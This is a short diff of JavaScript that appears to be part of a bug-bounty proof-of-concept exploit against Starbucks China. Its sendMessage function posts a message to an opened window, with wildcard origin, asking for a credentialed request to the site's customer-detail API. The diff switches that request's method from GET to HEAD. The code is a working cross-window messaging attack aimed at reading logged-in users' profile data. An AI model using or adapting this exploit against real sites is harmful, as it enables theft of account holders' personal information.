@@ -17,7 +17,7 @@ function openWin(){
 	}
 
 	function sendMessage(){
-var data = JSON.stringify({type:"GET",url:"https://profile.starbucks.com.cn/api/Customers/detail",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials:true}"});
+var data = JSON.stringify({type:"HEAD",url:"https://profile.starbucks.com.cn/api/Customers/detail",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials:true}"});
 	h1Win.postMessage(data,"*");
         console.log("postmessage successed for account!")
 			}
